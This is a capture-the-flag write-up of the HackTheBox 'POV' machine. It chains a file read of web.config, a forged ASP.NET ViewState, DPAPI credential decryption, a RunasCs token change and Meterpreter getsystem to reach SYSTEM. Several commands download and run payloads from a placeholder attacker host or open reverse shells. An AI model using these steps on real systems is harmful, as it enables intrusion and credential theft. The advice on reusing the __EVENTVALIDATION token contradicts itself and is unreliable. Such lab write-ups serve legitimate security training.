# HackTheBox — POV | Writeup

> **Platform:** HackTheBox
> **Author:** k41r0s3
> **Difficulty:** Medium
> **Category:** Windows / Web / .NET Deserialization
> **Date:** 2026-03-28

---

## Table of Contents

1. [TL;DR](#tldr)
2. [Recon](#recon)
3. [LFI — File Read via Absolute Path](#lfi--file-read-via-absolute-path)
4. [ViewState Deserialization RCE](#viewstate-deserialization-rce)
5. [Initial Access](#initial-access)
6. [Lateral Movement — sfitz → alaading](#lateral-movement--sfitz--alaading)
7. [Privilege Escalation — SeDebugPrivilege → SYSTEM](#privilege-escalation--sedebugprivilege--system)
8. [Attack Chain](#attack-chain)
9. [Tools Used](#tools-used)
10. [Vulnerabilities Exploited](#vulnerabilities-exploited)
11. [What Failed — Dead Ends](#what-failed--dead-ends)
12. [Key Takeaways](#key-takeaways)

---

## TL;DR

POV is a Medium Windows box centred on ASP.NET ViewState deserialization. A file download handler on `dev.pov.htb` accepts absolute paths in the `file` parameter, allowing the `web.config` to be read and the ASP.NET MachineKey to be extracted. With the key, `ysoserial.net` generates a malicious ViewState payload using the `WindowsIdentity` gadget, achieving RCE as the IIS user. Post-exploitation reveals a DPAPI-encrypted PSCredential XML that decrypts automatically in the current user's context, yielding credentials for a second local user who holds `SeDebugPrivilege`. Because PSSession creates a network logon token that strips privilege enablement, `RunasCs` is used to obtain an interactive token. A Meterpreter payload run from that interactive shell allows `getsystem` to reach `NT AUTHORITY\SYSTEM`.

---

## Recon

### Port Scan

```bash
nmap -p- --min-rate 10000 <TARGET>
nmap -p 80 -sCV <TARGET>
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
```

**Thought process:** Single open port — pure web box. IIS + ASP.NET headers visible in responses. With only one port, ViewState is immediately worth investigating as an attack surface.

### Vhost Discovery

```bash
ffuf -u http://pov.htb -H "Host: FUZZ.pov.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
```

Found: `dev.pov.htb` → redirects to `/portfolio`

**Key finding:** `dev.pov.htb/portfolio/default.aspx` — ASP.NET portfolio with a "Download CV" POST handler that accepts a `file` parameter.

---

## LFI — File Read via Absolute Path

### Discovery

The CV download handler sends:
```
POST /portfolio/default.aspx
__EVENTTARGET=download&file=cv.pdf
```

The server strips `../` from the `file` parameter but does not block absolute paths. IIS also prevents relative traversal outside the application root.

**Thought process:** When `../` filtering is in place and IIS blocks relative traversal, absolute paths are the natural next step. The app root sits one level above `/portfolio/` — no `web.config` exists in the portfolio directory.

### Exploitation

Intercept the request in Burp Repeater and replace `file=cv.pdf` with `file=/web.config`. Do not follow the 302 redirect — the file content is in the response body.

```http
POST /portfolio/default.aspx HTTP/1.1
Host: dev.pov.htb

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=<val>&__EVENTVALIDATION=<val>&file=/web.config
```

**Key finding:** `web.config` exposes the ASP.NET MachineKey — decryption algorithm, decryption key, validation algorithm, and validation key — everything needed to forge a malicious ViewState payload.

---

## ViewState Deserialization RCE

### The Vulnerability

ASP.NET ViewState stores client-side session data, signed and encrypted with the MachineKey. With the key in hand, an attacker can forge a ViewState containing a malicious serialized .NET gadget chain. When the server deserializes the payload on the next POST request, the gadget chain executes arbitrary code under the IIS worker process identity.

### Payload Generation

Using [ysoserial.net](https://github.com/pwntester/ysoserial.net):

```cmd
ysoserial.exe -p ViewState -g WindowsIdentity \
  -c "powershell iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER>/shell.ps1')" \
  --path="/portfolio" \
  --apppath="/" \
  --decryptionalg="AES" \
  --decryptionkey="<decryptionKey from web.config>" \
  --validationalg="SHA1" \
  --validationkey="<validationKey from web.config>"
```

**Critical parameters:**
- `-g WindowsIdentity` — gadget that works on this target; other gadgets do not trigger execution
- `--path="/portfolio"` — must match the application directory, NOT the full page path
- Output is URL-encoded and ready to paste directly as the `__VIEWSTATE` value

**Why it works:** The `WindowsIdentity` gadget chain abuses .NET BinaryFormatter deserialization. When the server loads the ViewState, BinaryFormatter deserializes the object graph and the gadget chain triggers `Process.Start`, executing the attacker's command.

### Burp Delivery — Critical Steps

1. Browse to `http://dev.pov.htb/portfolio/default.aspx` and click **Download CV** — Burp intercepts the POST request
2. Send it to **Repeater**
3. Replace the `__VIEWSTATE` value with the URL-encoded payload generated by ysoserial
4. Keep `__EVENTTARGET=download`, `__EVENTVALIDATION` (unchanged from original), and `file=cv.pdf` as-is
5. Send — shell catches on `nc -lvnp 4444`

```http
POST /portfolio/default.aspx HTTP/1.1
Host: dev.pov.htb
Content-Type: application/x-www-form-urlencoded

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=<YSOSERIAL_PAYLOAD_HERE>&__EVENTVALIDATION=<original_value>&file=cv.pdf
```

> The key insight: you only need to swap out `__VIEWSTATE`. The `__EVENTVALIDATION` from the intercepted legitimate request is valid and works fine — no need to refresh it separately.

---

## Initial Access

Shell obtained as the IIS AppPool identity via Nishang `Invoke-PowerShellTcp` reverse shell.

```bash
nc -lvnp 4444
# Windows PowerShell running as user <IIS_USER> on POV
```

Privileges are minimal — no `SeImpersonatePrivilege`, no `SeDebugPrivilege`.

---

## Lateral Movement — sfitz → alaading

### PSCredential Discovery

```powershell
Get-ChildItem C:\Users\sfitz\ -Recurse -Force -ErrorAction SilentlyContinue | where {$_.extension -eq ".xml"}
# C:\Users\sfitz\Documents\connection.xml
```

### The Vulnerability

`connection.xml` is a DPAPI-encrypted PSCredential export. DPAPI encryption is bound to the user's Windows profile — running `Import-Clixml` while operating in that user's context automatically decrypts the SecureString, revealing plaintext credentials.

```powershell
$cred = Import-Clixml C:\Users\sfitz\Documents\connection.xml
$cred.UserName                        # reveals the target account
$cred.GetNetworkCredential().Password # reveals the plaintext password
```

### Pivot

```powershell
# Single line required — multiline commands fail in reverse shell context
$cred = Import-Clixml C:\Users\sfitz\Documents\connection.xml; $s = New-PSSession -ComputerName localhost -Credential $cred; Invoke-Command -Session $s -ScriptBlock { iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER>/shell.ps1') }
```

Shell lands as the second user. User flag found on that user's Desktop.

---

## Privilege Escalation — SeDebugPrivilege → SYSTEM

### The Problem — Network Logon Token

The second user has `SeDebugPrivilege` assigned but it appears as **Disabled** inside the PSSession:

```
SeDebugPrivilege    Debug programs    Disabled
```

**Root cause:** PSSession creates a Type 3 (network) logon token. Network tokens cannot enable privileges even if they are assigned — the token's enabled privilege set is stripped at creation. Tools like `psgetsys.ps1` that call `Process.EnterDebugMode()` fail with `"Not all privileges or groups referenced are assigned to the caller"`.

### Fix — Interactive Logon Token via RunasCs

[RunasCs](https://github.com/antonioCoco/RunasCs) with `--logon-type 2` creates a Type 2 (interactive) logon token. Interactive tokens include the full privilege set in an enabled state.

```powershell
.\RunasCs.exe <user> <password> "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER>/shell.ps1')" --logon-type 2
```

New shell — `SeDebugPrivilege: Enabled` ✅

**Why it works:** Windows logon types determine the token's privilege state. Type 2 (interactive) logon creates a primary token with all assigned privileges enabled. Type 3 (network) logon creates a token with privileges present but not enabled, and many cannot be enabled at all in that context.

### Escalation via Meterpreter

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER> LPORT=<PORT> -f exe -o shell.exe
```

```powershell
# From interactive shell
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER>/shell.exe','C:\Windows\Temp\shell.exe')
C:\Windows\Temp\shell.exe
```

```
meterpreter > getsystem
meterpreter > shell
C:\> whoami
nt authority\system
```

---

## Attack Chain

```
nmap → Port 80 (IIS 10.0 / ASP.NET)
│
└── ffuf → dev.pov.htb/portfolio/default.aspx
    └── LFI via file=/web.config (absolute path bypass)
        └── ASP.NET MachineKey extracted
            └── ysoserial.net ViewState RCE
                (WindowsIdentity gadget, --path="/portfolio")
                │
                └── IIS user shell
                    └── PSCredential XML (DPAPI-encrypted)
                        └── Auto-decrypts → second user credentials
                            └── PSSession pivot → second user shell
                                └── user.txt ✅
                                    └── SeDebugPrivilege (Disabled — network token)
                                        └── RunasCs --logon-type 2
                                            └── SeDebugPrivilege Enabled
                                                └── Meterpreter getsystem
                                                    └── NT AUTHORITY\SYSTEM
                                                        └── root.txt ✅
```

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning |
| `ffuf` | Vhost discovery |
| `ysoserial.net v1.36` | ViewState deserialization payload generation |
| `Nishang Invoke-PowerShellTcp` | PowerShell reverse shell |
| `RunasCs v1.5` | Interactive logon token (Type 2) |
| `msfvenom + Metasploit` | Meterpreter payload + getsystem |
| `Burp Suite` | HTTP request manipulation |

---

## Vulnerabilities Exploited

| Vulnerability | Location | Impact |
| --- | --- | --- |
| LFI via absolute path | `file` parameter in CV download handler | Read arbitrary server files |
| ASP.NET ViewState deserialization | MachineKey exposed in `web.config` | RCE as IIS user |
| Insecure PSCredential storage | User's Documents folder | Credential disclosure |
| SeDebugPrivilege abuse | Second local user with interactive token | SYSTEM escalation |

---

## What Failed — Dead Ends

| Approach | Why It Failed |
| --- | --- |
| Other ysoserial gadget chains | Did not trigger code execution on this target |
| `--path` set to full page path | Wrong path silently rejects the payload |
| ViewState plugin via Wine/Mono | NullReferenceException — Mono .NET compatibility gap |
| Stale `__EVENTVALIDATION` token | Silent 302 redirect, no execution |
| `psgetsys.ps1` from PSSession | Network logon token — privilege enablement stripped |
| Meterpreter getsystem from PSSession | Network token — all getsystem techniques fail (error 1346) |
| Building ysoserial on Linux | .NET Framework 4.7.2 reference assemblies are Windows-only |

---

## Key Takeaways

**1. ViewState `--path` must match the application directory, not the page URL**
The path is used internally to compute `__VIEWSTATEGENERATOR`. Using the full page path instead of the app directory causes silent failure — no error, no execution, just a 302 redirect.

**2. PSSession creates a network logon token that strips privilege enablement**
Even if a privilege is assigned to a user, PSSession (Type 3) logon cannot enable it. This breaks any tool that relies on `SeDebugPrivilege`, `SeImpersonatePrivilege`, or similar. Use RunasCs with `--logon-type 2` to get an interactive token where privileges are actually usable.

**3. DPAPI-encrypted PSCredentials decrypt automatically in user context**
`Import-Clixml` silently decrypts DPAPI-protected SecureStrings when running as the owning user. No additional tools or cracking required — user context is sufficient.

**4. Always use a fresh `__EVENTVALIDATION` token when sending ViewState payloads**
The token is single-use and session-bound. Reusing a token from a previous request causes the server to silently reject the payload with a 302 — no error is shown.

**5. Meterpreter getsystem requires an interactive token to succeed**
Running getsystem from a network token context fails across all techniques. The meterpreter payload must be executed from within an interactive session — obtained here via RunasCs — for getsystem to work.

---

*Written by k41r0s3 | HackTheBox | POV | Medium*
